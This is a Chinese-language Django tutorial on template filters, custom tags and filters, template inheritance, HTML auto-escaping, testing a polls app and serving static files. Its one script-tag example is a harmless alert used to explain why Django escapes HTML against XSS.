You have {{ num_messages }} message{{ num_messages|pluralize }}.
如果num_messages是1,则输出为You have 1 message。 如果num_messages是2,输出为You have 2 messages。
另外如果需要的不是's'后缀的话, 可以提供一个备选的参数给过滤器:
You have {{ num_walruses }} walrus{{ num_walruses|pluralize:"es" }}.
对于非一般形式的复数,可以同时指定单复数形式,用逗号隔开。例如:
You have {{ num_cherries }} cherr{{ num_cherries|pluralize:"y,ies" }}.

pprint
用于调试的过滤器。

random
返回给定列表中的随机项。
{{ value|random }}

rjust
右对齐给定宽度字段中的值。
"{{ value|rjust:"10" }}"

safe
将字符串标记为安全,不需要转义

safeseq
将safe过滤器应用于序列的每个元素。与对序列进行其他过滤操作(例如join)一起使用时非常有用。
{{ some_list|safeseq|join:", " }}
在这种情况下不能直接使用safe过滤器,因为它首先将变量转换为字符串,而不是使用序列的各个元素。

slice
返回列表的一部分,也就是切片,与Python的列表切片相同的语法。
{{ some_list|slice:":2" }} # 如果some_list是['a', 'b', 'c'] ,输出将为['a', 'b']。

slugify
转换为ASCII,空格转换为连字符,删除不是字母数字、下划线或连字符的字符,转换为小写,还会去除前导和尾随空格。
{{ value|slugify }} # 如果value是Joel is a slug,输出为joel-is-a-slug

stringformat
根据参数格式化变量。
{{ value|stringformat:"E" }} # 如果value为10,输出将为1.000000E+01。

striptags
尽可能的去除HTML中的标签。
{{ value|striptags }} # 如果value是< b>Joel< /b> < button>is< /button> a < span>slug< /span>,输出Joel is a slug。

time
根据给定的格式,格式化时间。给定格式可以是预定义的TIME_FORMAT,也可以是与date过滤器相同的自定义格式。
{{ value|time:"H:i" }} # 如果value等于datetime.datetime.now(),则输出字符串01:23。
time过滤器只接受格式字符串中与时间相关的参数,而不是日期。如果需要格式化date值,请改用date过滤器

timesince
将日期格式设为自该日期起的时间(例如,"4天,6小时")。
采用一个可选参数,它是一个包含用作比较点的日期的变量。例如blog_date表示2006年6月1日午夜的日期实例,comment_date是2006年6月1日08:00,则{{ blog_date|timesince:comment_date }} ago将返回"8 hours ago":

timeuntil
类似于timesince,它测量从现在开始直到给定日期或日期时间的时间。例如今天是2006年6月1日,而conference_date是2006年6月29日,则{{ conference_date | timeuntil }}将返回"4 weeks"之后。
可选参数是一个包含用作比较点的日期变量。如果from_date为2006年6月22日,则以下内容将返回"1 weeks":
{{ conference_date|timeuntil:from_date }}

title
将所有单词的首字母大写,其它字母小写。
{{ value|title }} # 如果value为"my FIRST post",输出将为"My First Post"。

truncatechars
如果字符串包含的字符总个数多于指定的字符数量,那么会被截断掉后面的部分,截断的字符串将以"..."结尾。
{{ value|truncatechars:9 }} # 如果value是Joel is a slug,输出为Joel i...

truncatechars_html
类似于truncatechars,但是会保留HTML标记。
{{ value|truncatechars_html:9 }} # 如果value是< p>Joel is a slug< /p>,输出< p>Joel i...< /p>。

truncatewords
在一定数量的字数后截断字符串,与truncatechars不同的是,这个以字的个数计数,而不是字符计数。
{{ value|truncatewords:2 }} # 如果value 是Joel is a slug, 输出为Joel is ...

truncatewords_html
类似于truncatewords,但是保留HTML标记。
{{ value|truncatewords_html:2 }} # HTML内容中的换行符将保留。

unordered_list
接收一个嵌套的列表,返回一个HTML的无序列表,但不包含开始和结束的ul标签。
例如var = ['States', ['Kansas', ['Lawrence', 'Topeka'], 'Illinois']], 那么{{ var|unordered_list }}将返回:

</pre><textarea>
< li>States
    < ul>
        < li>Kansas
        < ul>
                < li>Lawrence< /li>
                < li>Topeka< /li>
        < /ul>
        < /li>
        < li>Illinois< /li>
    < /ul>
< /li>

</textarea><pre>
upper
将字符串转换为全部大写的形式:
{{ value|upper }}

urlencode
转义要在URL中使用的值。
{{ value|urlencode }} # 如果value为https://www.example.org/foo?a=b&c=d,输出https%3A//www.example.org/foo%3Fa%3Db%26c%3Dd

urlize
将文字中的网址和电子邮件地址转换为可点击的链接,该模板标签适用于前缀为http://、https://的链接或www,由urlize生成的链接会向其中添加rel="nofollow"属性。
{{ value|urlize }}
如果value是Check out www.djangoproject.com,输出Check out < a href="http://www.djangoproject.com" rel="nofollow">www.djangoproject.com< /a>。
除了超级链接之外,urlize也会将电子邮件地址转换为邮件地址链接。 如果value是Send questions to foo@example.com,输出将是Send questions to < a href="mailto:foo@example.com">foo@example.com< /a>

urlizetrunc
将网址和电子邮件地址转换为可点击的链接,就像urlize,但截断长度超过给定字符数限制的网址。
{{ value|urlizetrunc:15 }}
如果value是Check out www.djangoproject.com,将输出Check out < a href="http://www.djangoproject.com" rel="nofollow">www.djangopr...< /a>'.
与urlize一样,此过滤器应仅应用于纯文本。

wordcount
返回单词的个数。
{{ value|wordcount }} # 如果value是Joel is a slug,输出4。

wordwrap
以指定的行长度,换行单词。
{{ value|wordwrap:5 }}
如果value是Joel is a slug,输出为:
Joel
is a
slug

yesno
将True,False和None映射成字符串'yes','no','maybe'。
{{ value|yesno:"yeah,no,maybe" }}

django.contrib.humanize
一组Django模板过滤器,用于向数据添加"人性化",更加可读
为了提高模板系统对人类的友好性,Django在django.contrib.humanize中提供了一系列的模板过滤器,有助于为数据展示添加"人文关怀"。
需要把django.contrib.humanize添加到INSTALLED_APPS设置中来激活这些过滤器,然后在模板中使用{% load humanize %}标签,就可以使用下面的过滤器了

apnumber
对于数字1~9返回英文单词,否则返回数字本身,这遵循了出版图书的格式。可以传递整数或整数的字符串形式
1会变成one。
2会变成two。
10会变成10。

intcomma
将整数或浮点数或两者的字符串表示形式转换为每隔三位数字包含逗号的字符串,这在财务报表中很有用。
4500 会变成 4,500。
4500.2 变为 4,500.2。
45000 会变成 45,000
450000 会变成 450,000。
4500000 会变成 4,500,000。
如果启动了Format localization,还将遵循用户本地国家标准。例如在德语('de')中:
45000 会变成 '45.000'。
450000 会变成 '450.000'。

intword
将大整数(或整数的字符串表示形式)转换为友好的文本表示形式。适用于超过一百万的数字。支持高达10的100次方 (Googol) 的整数
1000000 会变成 1.0 million。
1200000 会变成 1.2 million。
1200000000 会变成 1.2 billion。
如果启动了Format localization,还将遵循用户本地国家标准。例如在德语('de')中:
1000000 会变成 '1,0 Million'。
1200000 会变成 '1,2 Million'。
1200000000 会变成 '1,2 Milliarden'。

naturalday
对于当天或一天之内的日期,返回"today","tomorrow"或者"yesterday"的表示形式,视情况而定,否则使用传进来的格式字符串进行日期格式化。
例如("今天"是2007年2月17日):
16 Feb 2007 会变成 yesterday。
17 Feb 2007 会变成 today。
18 Feb 2007 会变成 tomorrow。
其它的日期,还是按照传统的方法展示。

naturaltime
对于日期时间的值,返回一个字符串来表示多少秒、分钟或小时之前。如果超过一天之前则回退为使用timesince格式。如果是未来的日期时间,返回值会自动使用合适的文字表述。
例如("现在"是2007年2月17日16时30分0秒):
17 Feb 2007 16:30:00 会变成 now。
17 Feb 2007 16:29:31 会变成 29 seconds ago。
17 Feb 2007 16:29:00 会变成 a minute ago。
17 Feb 2007 16:25:35 会变成 4 minutes ago。
17 Feb 2007 15:30:29 会变成 59 minutes ago。
17 Feb 2007 15:30:01 会变成 59 minutes ago。
17 Feb 2007 15:30:00 会变成 an hour ago。
17 Feb 2007 13:31:29 会变成 2 hours ago。
16 Feb 2007 13:31:29 会变成 1 day, 2 hours ago。
16 Feb 2007 13:30:01 会变成 1 day, 2 hours ago。
16 Feb 2007 13:30:00 会变成 1 day, 3 hours ago。
17 Feb 2007 16:30:30 会变成 30 seconds from now。
17 Feb 2007 16:30:29 会变成 29 seconds from now。
17 Feb 2007 16:31:00 会变成 a minute from now。
17 Feb 2007 16:34:35 会变成 4 minutes from now。
17 Feb 2007 17:30:29 会变成 an hour from now。
17 Feb 2007 18:31:29 会变成 2 hours from now。
18 Feb 2007 16:31:29 会变成 1 day from now。
26 Feb 2007 18:31:29 会变成 1 week, 2 days from now。

ordinal
将一个整数转化为它的序数词字符串。
1 会变成 1st。
2 会变成 2nd。
3 会变成 3rd。

4. 注释
模版语言的注释:
{# this won't be rendered #} # 单行注释,在{# .... #}中不允许有新行
{% comment %}标签提供多行注释功能。

【 自定义标签和过滤器 】
Django虽然内置了二十多种标签和六十多种过滤器,但有时cover不到。Django提供了自定义的机制,可以通过使用Python代码自定义标签和过滤器来扩展模板引擎,然后使用{% load %}标签

一、前置步骤
Django对于自定义标签和过滤器是有前置要求的,首先一条就是代码布局和文件组织。
可以为自定义标签和过滤器新开一个app,也可以在原有的某个app中添加。
第一步在app中新建一个templatetags包,和views.py、models.py等文件处于同一级别目录下,创建__init__.py文件以使得该目录可作为Python包
在添加templatetags包后,需要重新启动服务器,然后才能在模板中使用标签或过滤器。
将自定义的标签和过滤器将放在templatetags包下的一个模块里。
这个模块的名字是后面载入标签时使用的标签名,所以要谨慎选择名字以防与其他应用下的自定义标签和过滤器名冲突,更不能与Django内置的冲突。
假设自定义的标签/过滤器在一个名为poll_extras.py的文件中
为了让{% load xxx %}标签正常工作,包含自定义标签的app必须在INSTALLED_APPS中注册,然后就可以在模板中像如下这样使用:
{% load poll_extras %}
在templatetags包中放多少个模块没有限制,只需要记住{% load xxx %}将会载入给定模块名中的标签/过滤器,而不是app中所有的标签和过滤器。
要在模块内自定义标签,首先这个模块必须包含一个名为register的变量,它是template.Library的一个实例,所有的标签和过滤器都是在其中注册的。所以把如下的内容放在模块的顶部:
from django import template
register = template.Library()
可以阅读Django的默认过滤器和标记的源代码,它们分别位于django/template/defaultfilters.py和django/template/defaulttags.py

自定义模板过滤器
1. 编写过滤器
自定义过滤器就是一个带有一个或两个参数的Python函数:
这个Python函数的第一个参数是要过滤的对象,第二个参数才是自定义的参数,最多总共只能有两个参数,所以只能自定义一个参数,这是过滤器的先天限制。

变量的值:不一定是字符串形式。
参数的值:可以有一个初始值或完全不要这个参数。
例如在{{ var|foo:"bar" }}中,foo过滤器应当传入变量var和参数"bar"。
由于模板语言没有提供异常处理,任何从过滤器中抛出的异常都将会显示为服务器错误。

</pre>下面是一个定义过滤器的例子<textarea>
def cut(value, arg):
    """将value中的所有arg部分切除掉"""
    return value.replace(arg, '')

# 这个过滤器的使用方法:
{{ somevariable|cut:"0" }}

# 大多数过滤器没有参数,在这种情况下过滤器函数不带额外的参数即可,但基本的value参数是必带的
def lower(value): # Only one argument.
    """Converts a string into all lowercase"""
    return value.lower()

</textarea><pre>
2. 注册过滤器
类原型:django.template.Library.filter()
一旦写好了过滤器函数就需要注册它,方法是调用register.filter,比如:
register.filter('cut', cut)
register.filter('lower', lower)

Library.filter()方法需要两个参数:
过滤器的名称:一个字符串对象
编译的函数:刚才写的过滤器函数

</pre>还可以把register.filter()用作装饰器,以如下的方式注册过滤器,没有声明name参数,Django将使用函数名作为过滤器的名字<textarea>
@register.filter(name='cut')
def cut(value, arg):
    return value.replace(arg, '')

@register.filter
def lower(value):
    return value.lower()

</textarea><pre>
自定义模板标签
标签比过滤器更复杂,因为标签可以做任何事情。Django提供了大量的快捷方式,使得编写标签比较容易。 对于一般的自定义标签来说,simple_tag是最重要的,它帮助将一个Python函数注册为一个简单的模版标签。

1. simple_tag
原型:django.template.Library.simple_tag()
为了简单化模版标签的创建,Django提供一个辅助函数simple_tag,这个函数是django.template.Library的一个方法。

</pre>比如想编写一个返回当前时间的模版标签,那么current_time函数从而可以这样写<textarea>
import datetime
from django import template
register = template.Library()

@register.simple_tag
def current_time(format_string):
    return datetime.datetime.now().strftime(format_string)

</textarea><pre>
关于simple_tag函数有几件值得注意的事项︰
如果不需要额外的转义,可以使用mark_safe()让输出不进行转义,前提是绝对确保代码中不包含XSS漏洞。 如果要创建小型HTML片段,强烈建议使用format_html()而不是mark_safe()。
如果模板标签需要访问当前上下文,可以在注册标签时使用takes_context参数︰

</pre><textarea>
@register.simple_tag(takes_context=True)
def current_time(context, format_string): # 第一个参数必须称作context
    timezone = context['timezone']
    return your_get_current_time_method(timezone, format_string)

# 如果需要重命名标签,可以给它提供自定义的名称︰
register.simple_tag(lambda x: x - 1, name='minusone')

@register.simple_tag(name='minustwo')
def some_function(value):
    return value - 2

# simple_tag函数可以接受任意数量的位置参数和关键字参数:
@register.simple_tag
def my_tag(a, b, *args, **kwargs):
    warning = kwargs['warning']
    profile = kwargs['profile']
    ...
    return ...

# 然后在模板中可以将任意数量的由空格分隔的参数传递给模板标签。像在Python中一样,关键字参数的值使用等号("=")赋予,并且必须在位置参数之后提供
{% my_tag 123 "abcd" book.title warning=message|lower profile=user.profile %}

# 可以将标签结果存储在模板变量中,而不是直接输出。这是通过使用as参数后跟变量名来实现的:
{% current_time "%Y-%m-%d %I:%M %p" as the_time %}
< p>The time is {{ the_time }}.< /p>

</textarea><pre>
2. inclusion_tag()
原型:django.template.Library.inclusion_tag()
另一种常见类型的模板标签是通过渲染一个模板来显示一些数据。例如Django的Admin界面使用自定义模板标签显示"添加/更改"表单页面底部的按钮。这些按钮看起来总是相同,但链接的目标却是根据正在编辑的对象而变化的。
这种类型的标签被称为"Inclusion标签"。

</pre><textarea>
# 下面展示一个根据给定的tutorials中创建的Poll对象输出一个选项列表的自定义Inclusion标签。在模版中它是这么调用的:
{% show_results poll %}

# 而输出是这样的:
<ul>
  <li>First choice</li>
  <li>Second choice</li>
  <li>Third choice</li>
</ul>

# 具体的编写方法,首先编写Python函数:
def show_results(poll):
    choices = poll.choice_set.all()
    return {'choices': choices}

# 接下来创建用于标签渲染的模板results.html︰
<ul>
{% for choice in choices %}
    <li> {{ choice }} </li>
{% endfor %}
</ul>

# 最后通过调用Library对象的inclusion_tag()装饰器方法创建并注册Inclusion标签︰
@register.inclusion_tag('results.html')
def show_results(poll):
    ...

# 或者使用django.template.Template实例注册Inclusion标签︰
from django.template.loader import get_template
t = get_template('results.html')
register.inclusion_tag(t)(show_results)

# inclusion_tag函数可以接受任意数量的位置参数和关键字参数
@register.inclusion_tag('my_template.html')
def my_tag(a, b, *args, **kwargs):
    warning = kwargs['warning']
    profile = kwargs['profile']
    ...
    return ...

# 然后在模板中可以将任意数量的由空格分隔的参数传递给模板标签。像在Python中一样,关键字参数的值的设置使用等号("=") ,并且必须在位置参数之后提供
{% my_tag 123 "abcd" book.title warning=message|lower profile=user.profile %}

# 可以在标签中传递上下文中的参数。比如想要将上下文context中的home_link和home_title这两个变量传递给模版:
@register.inclusion_tag('link.html', takes_context=True) # 指定了takes_context=True和模板的名字,takes_context=True表示不需要传递参数给这个模板标签,它会自己去获取上下文。
def jump_link(context):  # 函数的第一个参数必须叫做context。context必须是一个字典类型
    return {
        'link': context['home_link'],
        'title': context['home_title'],
    }

# 模板link.html很简单,如下所示:
Jump directly to < a href="{{ link }}">{{ title }}</a>.

# 然后当任何时候想调用这个自定义的标签时,只需要load它本身,不需要添加任何参数,{{ link }}和{{ title }}会自动从标签中获取参数值:
{% jump_link %}

</textarea><pre>
【 使用自定义标签和过滤器 】
某些应用提供了自定义的标签和过滤器,想要在模板中使用它们,首先要确保该应用已经在INSTALLED_APPS中,比如在下面的例子中添加了'django.contrib.humanize',之后在模板中使用load标签:
{% load humanize %}
{{ 45000|intcomma }}
上面的例子中load标签加载了humanizeapp的标签库,之后可以使用它的intcomma过滤器。

如果开启了django.contrib.admindocs,可以查询admin站点中的文档,查看安装的自定义库列表。

load标签可以同时接受多个库名称,由空格分隔,例如:
{% load humanize i18n %}

自定义库和模板继承:
当加载一个自定义标签或过滤器库时,标签或过滤器只在当前模板中有效,并不是带有模板继承关系的任何父模板或子模版中都有效,即在父模板中可能加载了自定义标签,然而在子模版中还要再加载一次

例如如果一个模板foo.html带有{% load humanize %},子模版带有{% extends "foo.html" %}中不能访问humanize模板标签和过滤器,子模版需要再添加自己的{% load humanize %}

这个特性是出于保持可维护性和逻辑性的目的。

【 模板 】
模版是纯文本文件,可以生成任何基于文本的文件格式,比如HTML、XML、CSV等

</pre><textarea>
{% extends "base_generic.html" %}

{% block title %}{{ section.title }}{% endblock %}

{% block content %}
< h1>{{ section.title }}< /h1>

{% for story in story_list %}
< h2>
  < a href="{{ story.get_absolute_url }}">{{ story.headline|upper }}< /a>
< /h2>
< p>{{ story.tease|truncatewords:"100" }}< /p>
{% endfor %}
{% endblock %}

</textarea><pre>
【 模板继承 】
Django模版引擎中最强大最复杂的部分是模版继承,模版继承允许创建一个包含基本"骨架"的父亲模版,它包含站点中的共有元素,并可定义能够被子模版覆盖的blocks

</pre><textarea>
# 这个模版通常被命名为base.html,它定义了一个可以用于两列排版页面的简单HTML骨架
< !DOCTYPE html>
< html lang="en">
< head>
    < link rel="stylesheet" href="style.css" />
    < title>{% block title %}My amazing site{% endblock %}< /title>
< /head>

< body>
    < div id="sidebar">
        {% block sidebar %}
        < ul>
            < li>< a href="/">Home< /a>< /li>
            < li>< a href="/blog/">Blog< /a>< /li>
        < /ul>
        {% endblock %}
    < /div>

    < div id="content">
        {% block content %}{% endblock %}
    < /div>
< /body>
< /html>

# "子模版"需要做的是先继承父模板base.html,然后复写、填充或者说实现其中的blocks。
# block是在子模版中可能会被覆盖掉的位置。上面的例子block标签定义了三个可以被子模版内容填充的block:title、content和siderbar

# extends标签告诉模版引擎这个模版"继承"了另一个模版。当模版系统处理这个模版时,首先会去加载父模版即"base.html",加载过程中模版引擎将注意到base.html中的三个block标签,并用子模版中的内容来替换这些block
# {% extends %}标签必须是模版中的第一个标签,必须放在文件首行
{% extends "base.html" %}

{% block title %}My amazing blog{% endblock %}

{% block content %}
{% for entry in blog_entries %}
    < h2>{{ entry.title }}< /h2>
    < p>{{ entry.body }}< /p>
{% endfor %}
{% endblock %}

# 子模版并没有定义sidebar block,这种情况下将使用父模版中的内容,父模版的{% block %}标签中的内容总是被用作默认内容。

</textarea><pre>
Django还支持多级继承,常用方式是类似下面的三级结构:
1、创建一个base.html模版,用来控制整个站点的主要视觉和体验。
2、为站点的每一个app创建一个base_SECTIONNAME.html模版,如base_news.html,base_sports.html,这些模版都继承base.html,并包含了各自特有的样式和设计。
3、为每一个页面类型,创建独立的模版,例如新闻内容或博客文章,这些模版继承对应app的模版。

上面的方式可以使代码得到最大程度的复用,并且使得添加内容到共享的内容区域更加简单,例如app范围内的导航条。

在base模版中设置越多的{% block %}标签越好,子模版不必定义全部父模版中的blocks,所以可以在大多数blocks中填充合理的默认内容,然后只定义需要的那一个,多一点钩子总比少一点好。
如果发现在复制大量重复的模版内容,那意味着应该把重复的内容移动到父模版中的一个{% block %}中。

如果需要获取父模板中的block的内容,即想要在父block中新增内容而不是完全覆盖它,可以使用{{ block.super }}变量,使用{{ block.super }}插入的数据不会被自动转义,因为父模板中的内容已经被转义。

在{% block %}之外创建的变量使用模板标签的as语法,不能在块内使用,例如下面的模板不会显示任何内容:
{% trans "Title" as title %}
{% block content %}{{ title }}{% endblock %}

为了更好的可读性,可以给{% endblock %}标签一个取名字,像这样:
{% block content %} ...
在大型模版中,这有助于清楚的看到哪一个{% block %}标签被关闭了。

【 自动转义HTML 】
当从模版中生成HTML文件时总会存在各种风险,比如xss代码注入等恶意攻击

Hello, {{ name }}
首先它看起来像是无害的,用来显示用户的名字,但是设想一下如果用户像下面这样输入他的名字会发生什么:
< script>alert('hello')< /script>
使用这个名字的值,模版将会被渲染成这样:
Hello, < script>alert('hello')< /script>

类似的,如果名字包含一个<符号会发生什么呢？
< b>username
这将会导致模版被渲染成这样:
Hello, < b>username
这会导致网页的其余部分被粗体化！

显然用户提交的数据都被不应该被盲目的信任并直接插入到网页中,因为一个怀有恶意的用户可能会使用这样的漏洞来做一些坏事。 这种类型的安全问题被叫做跨站脚本攻击(Cross Site Scripting)(XSS)。

避免这个问题有两个选择:
第一,对每个不被信任的值运行escape过滤器,这将把潜在的有害的HTML字符转换成无害的字符串。在Django最初的几年里,这是默认的解决方案,但问题是它将责任放在开发人员/模板作者身上,以确保转义了所有内容,而且很容易忘记转义数据。
第二,利用Django的自动HTML转义功能。默认情况下Django中的每个模板会自动转义每个变量。也就是说下面五个字符将被转义:
<会转换为& lt;
>会转换为& gt;
单引号转换为& #39;
双引号会转换为& quot;
&会转换为& amp;

但凡事都有正反两面,有时模板变量含有一些打算渲染成原始HTML的数据,并不想转义这些内容。例如可能会在数据库中储存一些HTML代码,并且直接在模板中嵌入它们,或者可能使用Django的模板系统来生成不是HTML的文本比如邮件信息,怎么办呢？

对于单个变量:
使用safe过滤器来关闭变量上的自动转义:
This will be escaped: {{ data }}
This will not be escaped: {{ data|safe }}
safe是safe from further escaping或can be safely interpreted as HTML的缩写,在上面的例子中,如果data含有< b>,输出会是:
This will be escaped: & lt;b& gt;
This will not be escaped: < b>

对于模板块:
要控制模板上的自动转义,将模板或模板中的特定区域包裹在autoescape标签中
{% autoescape off %}
    Hello {{ name }}
{% endautoescape %}

</pre>autoescape标签接受on或者off作为它的参数,默认on<textarea>
{% autoescape off %}
    This will not be auto-escaped: {{ data }}.

    Nor this: {{ other_data }}
    {% autoescape on %}
        Auto-escaping applies again: {{ name }}
    {% endautoescape %}
{% endautoescape %}

</textarea>自动转义标签autoescape还会作用于扩展(extend)了当前模板的模板以及通过include标签包含的模板,就像所有block标签那样<textarea>
# base.html文件
{% autoescape off %}
< h1>{% block title %}{% endblock %}< /h1>
{% block content %}{% endblock %}
{% endautoescape %}

# child.html文件
{% extends "base.html" %}
{% block title %}This & amp; that{% endblock %}
{% block content %}{{ greeting }}{% endblock %}

由于自动转义标签在base模板中关闭,它也会在child模板中关闭,导致当greeting变量含有< b>Hello!< /b>字符串时会渲染HTML。
< h1>This & amp; that< /h1>
< b>Hello!< /b>

</textarea><pre>
过滤器的字符串参数:
过滤器的参数可以是字符串:
{{ data|default:"This is a string literal." }}
所有这种字符串参数在插入模板时都不会进行任何自动转义,原因是模板的作者可以控制字符串字面值的内容,所以可以确保在模板编写时文本经过正确转义,白话讲就是程序员对自己传递的参数心里要有数！

也即是说应该这样编写:
{{ data|default:"3 & lt; 2" }}
而不是:
{{ data|default:"3 < 2" }}  {# 错误的做法#}

【 模板中方法调用 】
大多数对象上的方法调用同样可用于模板中,这意味着模板能够访问到的不仅仅是对象的属性(比如字段名称)和视图中传入的变量,还可以执行对象的方法。

Django ORM提供了"entry_set"语法用于查找关联到外键的对象集合,如果模型"comment"有一个外键关联到模型"task",可根据task遍历其所有的comments:
{% for comment in task.comment_set.all %}{{ comment }}{% endfor %}

与之类似,QuerySets提供了count()方法来计算含有对象的总数,因此可以像这样获取所有关于当前任务的评论总数:
{{ task.comment_set.all.count }}

</pre>当然还可以访问已经显式定义在模型上的方法<textarea>
# models.py
class Task(models.Model):
    def foo(self):
        return "bar"

# template.html
{{ task.foo }}

</textarea><pre>
由于Django有意限制了模板语言中的处理逻辑,不能够在模板中传递参数来调用方法。数据应该在视图中处理,然后传递给模板用于展示。这点不同于Django的ORM操作。

多对多调用
对于外键ForeignKey,其用法基本类似。只不过正向是obj.fk,且只有1个对像,不是集合。反向则是obj.fk_set,类似多对多。

</pre><textarea>
from django.db import models
class Student(models.Model):
    name = models.CharField(max_length=128)

class Course(models.Model):  # 模型Course有一个多对多字段指向Student模型
    name = models.CharField(max_length=128)
    students = models.ManyToManyField('Student')

# 正向查询
def test(request):
    course = models.Course.objects.get(pk=1)
    return render(request, 'course.html', locals())

# 获取了id为1的course对象,并将它传递给course.html模版,模版代码如下:
{% for student in course.students.all %}{{ student.name }}{% endfor %}

# 反向查询
def test2(request):
    student = models.Student.objects.get(pk=1)
    return render(request, 'student.html', locals())

# 获取了id为1的student对象,并将它传递给student.html模版,模版代码如下:
{% for course in  student.course_set.all %}{{ course.name }}{% endfor %}

</textarea>
</div>

<div id="django_test">
<h4>测试</h4><pre>
测试是一种例行的、不可缺失的工作,用于检查程序是否符合预期。

测试可以划分为不同的级别。一些测试可能专注于小细节,比如某一个模型的方法是否会返回预期的值,一些测试则专注于检查软件的整体运行是否正常,比如用户在对网站进行了一系列的输入后是否返回了期望的结果

测试可以分为手动测试和自动测试。手动测试很常见,有时候print一个变量内容都可以看做是测试的一部分。手动测试往往很零碎、不成体系、不够完整、耗时费力、效率低下,测试结果也不一定准确。

自动化测试则是系统地较为完整地对程序进行测试,效率高,准确性高,并且大部分共同的测试工作会由系统来帮助完成。一旦创建了一组自动化测试程序,当修改了应用就可以用这组测试程序来检查代码是否仍然同预期的那样运行,而无需执行耗时的手动测试

为什么需要测试？
测试可以节省时间
测试不仅仅可以发现问题,还能防止问题
测试使代码更受欢迎
测试有助于团队合作

编写测试程序
Django是一个全面、完善、严谨的Web框架,当然不会缺少测试功能

1.遇见BUG
投票应用中有一个小bug需要修改:在Question.was_published_recently()方法的返回值中,当Qeustion在最近的一天发布的时候返回True(这是正确的),然而当Question在未来的日期内发布的时候也返回True(这是错误的)。问题的核心在于允许创建在未来时间才发布的问卷,由于"未来"不等于"最近",因此这显然是个bug。

可以在admin后台创建一个发布日期在未来的Question,然后在shell中验证这个bug:

$ python manage.py shell
>>> import datetime
>>> from django.utils import timezone
>>> from polls.models import Question
>>> # 创建一个发布日期在30天后的问卷
>>> future_question = Question(pub_date=timezone.now() + datetime.timedelta(days=30))
>>> # 测试一下返回值
>>> future_question.was_published_recently()
True

2.创建一个测试来暴露这个bug
刚才是在shell中测试了这个bug,那如何通过自动化测试来发现这个bug呢？
通常会把测试代码放在应用的tests.py文件中,测试系统将自动地从任何名字以test开头的文件中查找测试程序。每个app在创建的时候都会自动创建一个tests.py文件

</pre>将下面的代码输入投票应用的polls/tests.py文件中<textarea>
from django.test import TestCase
import datetime
from django.utils import timezone
from .models import Question

class QuestionMethodTests(TestCase):
    def test_was_published_recently_with_future_question(self):
        """
        在将来发布的问卷应该返回False
        """
        time = timezone.now() + datetime.timedelta(days=30)
        future_question = Question(pub_date=time)
        self.assertIs(future_question.was_published_recently(), False)

</textarea><pre>
创建一个django.test.TestCase的子类,它具有一个方法,该方法创建一个pub_date在未来的Question实例。最后检查was_published_recently()的输出,它应该是False

3.运行测试程序
$ python3 manage.py test polls

结果如下:
Creating test database for alias 'default'...
System check identified no issues (0 silenced).
F
======================================================================
FAIL: test_was_published_recently_with_future_question (polls.tests.QuestionModelTests)
----------------------------------------------------------------------
Traceback (most recent call last):
  File "/path/to/mysite/polls/tests.py", line 16, in test_was_published_recently_with_future_question
    self.assertIs(future_question.was_published_recently(), False)
AssertionError: True is not False

----------------------------------------------------------------------
Ran 1 test in 0.001s

FAILED (failures=1)
Destroying test database for alias 'default'...

这其中都发生了些什么？:
python3 manage.py test polls命令会查找投票应用中所有的测试程序
发现一个django.test.TestCase的子类
为测试创建一个专用的数据库
查找名字以test开头的测试方法
在test_was_published_recently_with_future_question方法中创建一个Question实例,该实例的pub_data字段的值是30天后的未来日期。
然后利用assertIs()方法,它发现was_published_recently()返回了True,而不是希望的False。
最后,测试程序会通知哪个测试失败了,错误出现在哪一行。

整个测试用例基本上和Python内置的unittest非常相似

4.修复bug
已经知道了问题所在,现在可以去修复bug了。修改源代码polls/models.py:

def was_published_recently(self):
    now = timezone.now()
    return now - datetime.timedelta(days=1) <= self.pub_date <= now

再次运行测试程序,可以看到bug已经没有了
Creating test database for alias 'default'...
System check identified no issues (0 silenced).
.
----------------------------------------------------------------------
Ran 1 test in 0.001s

OK
Destroying test database for alias 'default'...

5.更加全面的测试
前面的测试用例还不够完整,为了使was_published_recently()方法更加可靠,在上面的测试类中再额外添加两个其它的方法来更加全面地进行测试。
有三个测试来保证无论发布时间是在过去、现在还是未来Question.was_published_recently()都将返回正确的结果。

</pre><textarea>
# polls/tests.py

def test_was_published_recently_with_old_question(self):
    """ 只要是超过1天的问卷,返回False """
    time = timezone.now() - datetime.timedelta(days=1, seconds=1)
    old_question = Question(pub_date=time)
    self.assertIs(old_question.was_published_recently(), False)

def test_was_published_recently_with_recent_question(self):
    """ 最近一天内的问卷,返回True """
    time = timezone.now() - datetime.timedelta(hours=23, minutes=59, seconds=59)
    recent_question = Question(pub_date=time)
    self.assertIs(recent_question.was_published_recently(), True)

</textarea>
</div>

<div id="django_static">
<h4>静态文件</h4><pre>
除了由服务器生成的HTML文件外,WEB应用一般需要提供一些其它的必要文件,比如图片文件、Js脚本和CSS样式表等等,用来为用户呈现出一个完整的网页。在Django中将这些文件统称为"静态文件",因为这些文件的内容基本是固定不变的,不需要动态生成

django.contrib.staticfiles将收集各个应用和一些指明目录里的的静态文件到一个统一指定的地方,并且易于访问
在polls目录下创建static目录,Django将在该目录下查找静态文件,这种方式和Diango在polls/templates/目录下查找template的方式类似

Django的STATICFILES_FINDERS设置包含了一系列的查找器,它们知道去哪里找到static文件。AppDirectoriesFinder是默认查找器中的一个,它会在每个INSTALLED_APPS中指定的应用的子文件中寻找名称为static的特定文件夹,例如刚创建的那个static目录。admin管理站点也为它的静态文件使用相同的目录结构

在刚创建的static文件夹中创建一个名为polls的文件夹,再在polls文件夹中创建一个style.css文件,这个css文件路径应是polls/static/polls/style.css。因为AppDirectoriesFinder的存在,可以在Django中简单地使用以polls/style.css的形式引用访问此文件,类似引用模板路径的方式。

静态文件命名空间
与模板类似,虽然可以把static文件直接放入polls/static,而不是创建另一个polls子文件夹,不过这实际上不是一个好做法。Django只会使用第一个找到的静态文件。如果在其它应用中有一个相同名字的静态文件,Django将无法区分它们。需要指引Django选择正确的静态文件,而最简单的方式就是把它们放入各自的命名空间,也就是把这些静态文件放入另一个与应用名相同的目录中,多建一层与应用同名的子目录

良好的目录结构是每个应用都应该创建自己的urls、forms、views、models、templates和static,每个templates包含一个与应用同名的子目录,每个static也包含一个与应用同名的子目录

添加一个背景图
创建一个用于存在图像的目录,在polls/static/polls目录下创建一个名为images的子目录,在这个目录中放一张名为bg.jpg的图片

</pre><textarea>
# polls/static/polls/style.css
body { background: white url("images/bg.jpg") no-repeat; }
li a { color: green; }

# polls/templates/polls/index.html:{% static %}模板标签会生成静态文件的绝对路径
{% load static %}
< link rel="stylesheet" type="text/css" href="{% static 'polls/style.css' %}">

</textarea><pre>
